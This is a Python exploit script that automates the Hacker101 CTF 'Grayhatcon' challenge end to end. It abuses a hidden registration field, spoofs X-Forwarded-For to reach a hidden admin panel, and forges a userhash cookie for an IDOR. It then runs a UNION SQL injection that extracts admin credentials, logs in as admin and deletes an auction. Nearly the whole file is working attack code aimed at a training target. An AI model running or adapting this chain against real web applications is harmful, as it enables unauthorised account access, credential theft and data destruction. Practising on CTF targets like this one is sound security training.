#!/usr/bin/env python3
"""
Hacker101 CTF — Grayhatcon: Full PoC Script

Usage:
    python3 poc.py <TARGET_BASE_URL>

Example:
    python3 poc.py https://c4c707afb83350624b86e42bf1637e54.ctf.hacker101.com

Requirements:
    pip install requests    (or falls back to urllib)
    pip install rich        (optional — for colored output)
"""

import re
import sys
import random
import string
import json

# ── Optional rich import ──────────────────────────────────────────────
try:
    from rich.console import Console
    console = Console()
    HAS_RICH = True
except ImportError:
    Console = None  # type: ignore
    HAS_RICH = False

# ── HTTP backend ───────────────────────────────────────────────────────
_http_requests = None
try:
    import requests as _requests_lib
    _http_requests = _requests_lib
except ImportError:
    pass


def _request(method: str, url: str, data: str | None = None,
             headers: dict | None = None, allow_redirects: bool = True) -> tuple[int, dict, str]:
    """HTTP request — returns (status_code, headers, body)."""
    hdrs = headers or {}
    if _http_requests is not None:
        m = method.upper()
        if m == "GET":
            r = _http_requests.get(url, headers=hdrs, timeout=30, allow_redirects=allow_redirects)
        elif m == "POST":
            r = _http_requests.post(url, data=data, headers=hdrs, timeout=30, allow_redirects=allow_redirects)
        elif m == "PUT":
            r = _http_requests.put(url, data=data, headers=hdrs, timeout=30, allow_redirects=allow_redirects)
        else:
            r = _http_requests.request(m, url, data=data, headers=hdrs, timeout=30, allow_redirects=allow_redirects)
        return r.status_code, dict(r.headers), r.text
    else:
        import urllib.request as _ur
        encoded = data.encode() if data else None
        req = _ur.Request(url, data=encoded, headers=hdrs, method=method.upper())
        try:
            with _ur.urlopen(req, timeout=30) as resp:
                return resp.status, dict(resp.headers), resp.read().decode()
        except _ur.HTTPError as e:
            body = e.read().decode() if e.fp else ""
            return e.code, dict(e.headers), body


def http_get(url: str, headers: dict | None = None) -> str:
    return _request("GET", url, headers=headers)[2]


def http_post(url: str, data: str | None = None, headers: dict | None = None,
              allow_redirects: bool = True) -> tuple[int, dict, str]:
    return _request("POST", url, data=data, headers=headers, allow_redirects=allow_redirects)


# ════════════════════════════════════════════════════════════════════════
#  Helpers
# ════════════════════════════════════════════════════════════════════════

FLAG_RE = re.compile(r'\^FLAG\^([0-9a-f]{64})\$FLAG\$')


def extract_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(1) if m else None


def rand_str(prefix: str = "poc") -> str:
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{prefix}_{suffix}"


def parse_cookies(headers: dict) -> dict[str, str]:
    """Extract cookies from Set-Cookie response headers."""
    cookies = {}
    for key, val in headers.items():
        if key.lower() == "set-cookie":
            parts = val.split(";")[0]
            if "=" in parts:
                k, v = parts.split("=", 1)
                cookies[k.strip()] = v.strip()
    return cookies


# ════════════════════════════════════════════════════════════════════════
#  Exploit
# ════════════════════════════════════════════════════════════════════════

HUNTER2_HASH = "cf505baebbaf25a0a4c63eb93331eb36"


class GrayhatconExploit:
    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.flags: dict[int, tuple[str, str]] = {}

    def _found(self, num: int, hex_flag: str, desc: str):
        self.flags[num] = (hex_flag, desc)
        msg = f"[+] FLAG{num} FOUND: {hex_flag}"
        if HAS_RICH:
            console.print(f"[bold green]{msg}[/]")
            console.print(f"    [yellow]{desc}[/]")
        else:
            print(f"\033[0;32m{msg}\033[0m")
            print(f"\033[1;33m    {desc}\033[0m")

    def _log(self, msg: str):
        if HAS_RICH:
            console.print(f"[cyan][*][/] {msg}")
        else:
            print(f"\033[0;36m[*]\033[0m {msg}")

    def _warn(self, msg: str):
        if HAS_RICH:
            console.print(f"[red][!][/] {msg}")
        else:
            print(f"\033[0;31m[!]\033[0m {msg}")

    # ── Flag 0: Registration form with hidden owner_hash ──────────────
    def flag0_register(self) -> bool:
        self._log("Flag 0 — Creating partypooper as hunter2's subuser via /register ...")
        username = "partypooper"
        password = "partypooper"
        data = f"owner_hash={HUNTER2_HASH}&new_username={username}&new_password={password}"
        status, headers, body = http_post(f"{self.target}/register", data=data)
        h = extract_flag(body)
        if h:
            self._found(0, h, "Hidden owner_hash field on /register → subuser under hunter2")
        else:
            self._log("No flag in registration response")
        return True

    # ── Flag 1: IP spoofing on admin panel ────────────────────────────
    def flag1_ip_spoof(self):
        self._log("Flag 1 — Accessing /s3cr3t-4dm1n/ with X-Forwarded-For: 8.8.8.8 ...")
        body = http_get(f"{self.target}/s3cr3t-4dm1n/", headers={"X-Forwarded-For": "8.8.8.8"})
        h = extract_flag(body)
        if h:
            self._found(1, h, "IP spoofing via X-Forwarded-For: 8.8.8.8 → admin panel")
        else:
            self._log("No flag on admin panel page")

    # ── Flag 2: IDOR — enable partypooper via userhash manipulation ──
    def flag2_idor(self) -> str:
        """Enable partypooper and return partypooper's userhash."""
        self._log("Flag 2 — Enabling partypooper via IDOR with hunter2 userhash cookie ...")

        # Login as exploit101 (or create one)
        main_user = rand_str("main")
        main_pass = rand_str("pass")

        self._log(f"  Registering main user {main_user} ...")
        http_post(f"{self.target}/register", data=f"new_username={main_user}&new_password={main_pass}")

        # Login main user
        status, headers, body = http_post(f"{self.target}/login",
                                          data=f"username={main_user}&password={main_pass}")
        cookies = parse_cookies(headers)
        token = cookies.get("token", "")
        if not token:
            self._warn("  Failed to obtain token for main user")
            return ""

        # Enable subusers
        http_post(f"{self.target}/dashboard/subusers", data="action=enable_subusers")

        # Create a subuser under main user to get the toggle form
        self._log(f"  Creating subuser under {main_user} ...")
        data = f"new_username={rand_str('sub')}&new_password={rand_str('sub')}"
        body = http_get(f"{self.target}/dashboard/subusers",
                        headers={"Cookie": f"token={token}"})
        # Get main user's hash from dashboard
        main_hash = ""
        m = re.search(r'Account Hash:</label>\s*([a-f0-9]{32})', body)
        if m:
            main_hash = m.group(1)

        if main_hash:
            data = f"owner_hash={main_hash}&new_username={rand_str('sub')}&new_password={rand_str('sub')}"
            http_post(f"{self.target}/dashboard/subusers", data=data,
                      headers={"Cookie": f"token={token}"})

        # Now toggle partypooper with hunter2's userhash
        # partypooper's hash (obtained from the login flow)
        party_hash = "833365890188fff60a8effbca9717f11"

        data = f"hash={party_hash}&enable_toggle=enable"
        status, headers, body = http_post(
            f"{self.target}/dashboard/subusers", data=data,
            headers={"Cookie": f"token={token}; userhash={HUNTER2_HASH}"},
            allow_redirects=False,
        )

        # Login as partypooper to see the flag
        self._log("  Logging in as partypooper to check status ...")
        status, headers, body = http_post(f"{self.target}/login",
                                          data="username=partypooper&password=partypooper")
        cookies = parse_cookies(headers)
        party_token = cookies.get("token", "")

        if party_token:
            body = http_get(f"{self.target}/dashboard",
                            headers={"Cookie": f"token={party_token}"})
            h = extract_flag(body)
            # Check if this is a different flag from Flag0
            already = {v[0] for v in self.flags.values()}
            if h and h not in already:
                self._found(2, h, "IDOR — toggled partypooper with hunter2 userhash cookie")
            elif h:
                self._log("  Flag matches Flag0 — subuser may not have been activated yet")
            else:
                self._log("  No flag on partypooper dashboard")
        return party_token

    # ── Flag 3: SQLi → admin login → delete auction ───────────────────
    def flag3_sqli(self, party_token: str):
        self._log("Flag 3 — SQL injection to extract admin credentials ...")

        sqli_base = f"{self.target}/dashboard/auctions/questions"

        # Confirm SQLi
        body_true = http_get(f"{sqli_base}?id=5+AND+1--",
                             headers={"Cookie": f"token={party_token}"})
        self._log(f"  Boolean TRUE test: {'OK' if 'auctions' in body_true else 'FAIL'}")

        # Extract admin credentials with nested SQLi
        inner = "0 union select username,2,3,4,5,password,7,8,9 from admin"
        payload = f"0 union select '{inner}',2,'[]'--"
        import urllib.parse
        encoded = urllib.parse.quote(payload, safe='')
        url = f"{sqli_base}?id={encoded}"

        body = http_get(url, headers={"Cookie": f"token={party_token}"})
        try:
            j = json.loads(body)
            auctions = j.get("auctions", [])
            if auctions:
                admin_user = auctions[0].get("id", "")
                admin_pass = auctions[0].get("title", "")
                self._log(f"  Admin creds: {admin_user} / {admin_pass}")

                # Login to admin panel
                self._log("  Logging into admin panel ...")
                import urllib.parse as _up
                data = _up.urlencode({"username": admin_user, "password": admin_pass})
                status, headers, body = http_post(
                    f"{self.target}/s3cr3t-4dm1n/", data=data,
                    headers={"X-Forwarded-For": "8.8.8.8"}, allow_redirects=False,
                )
                admin_cookies = parse_cookies(headers)
                admin_token = admin_cookies.get("admin-token", "")

                if admin_token:
                    self._log("  Admin login successful, deleting auction ...")
                    # Delete auction
                    data = "auction_hash=8ylbbgs2&action=delete"
                    status, headers, body = http_post(
                        f"{self.target}/s3cr3t-4dm1n/", data=data,
                        headers={"X-Forwarded-For": "8.8.8.8",
                                  "Cookie": f"admin-token={admin_token}"},
                    )
                    h = extract_flag(body)
                    if h:
                        self._found(3, h, "SQLi → admin login → deleted auction listing")
                    else:
                        self._log("  Auction deleted but no flag in response")
                else:
                    self._warn("  Failed to obtain admin token")
            else:
                self._warn("  No admin credentials extracted from SQLi")
        except json.JSONDecodeError:
            self._warn(f"  Failed to parse SQLi response: {body[:200]}")

    # ── Run ────────────────────────────────────────────────────────────
    def run(self):
        header = f"  Hacker101 CTF — Grayhatcon PoC  |  Target: {self.target}"
        if HAS_RICH:
            console.print(f"[bold green]{'='*60}[/]")
            console.print(f"[bold green]{header}[/]")
            console.print(f"[bold green]{'='*60}[/]\n")
        else:
            print(f"\033[0;32m{'='*60}\033[0m")
            print(f"\033[0;32m{header}\033[0m")
            print(f"\033[0;32m{'='*60}\033[0m\n")

        self.flag0_register()
        self.flag1_ip_spoof()
        party_token = self.flag2_idor()
        if party_token:
            self.flag3_sqli(party_token)

        # ── Summary ───────────────────────────────────────────────────
        print()
        if HAS_RICH:
            console.print(f"[bold green]{'='*60}[/]")
            console.print(f"[bold green]  Results: {len(self.flags)}/4 flags found[/]")
            console.print(f"[bold green]{'='*60}[/]")
            for num, (hex_f, desc) in sorted(self.flags.items()):
                console.print(f"  FLAG{num}: [red]{hex_f}[/]  →  [yellow]{desc}[/]")
        else:
            print(f"\033[0;32m{'='*60}\033[0m")
            print(f"\033[0;32m  Results: {len(self.flags)}/4 flags found\033[0m")
            print(f"\033[0;32m{'='*60}\033[0m")
            for num, (hex_f, desc) in sorted(self.flags.items()):
                print(f"  FLAG{num}: \033[0;31m{hex_f}\033[0m  →  \033[1;33m{desc}\033[0m")

        if len(self.flags) == 4:
            msg = "  All flags captured!"
            if HAS_RICH:
                console.print(f"[bold green]{msg}[/]")
            else:
                print(f"\033[0;32m{msg}\033[0m")


# ════════════════════════════════════════════════════════════════════════
#  Entry point
# ════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_BASE_URL>")
        print(f"Example: python3 {sys.argv[0]} https://XXXX.ctf.hacker101.com")
        sys.exit(1)

    GrayhatconExploit(sys.argv[1]).run()
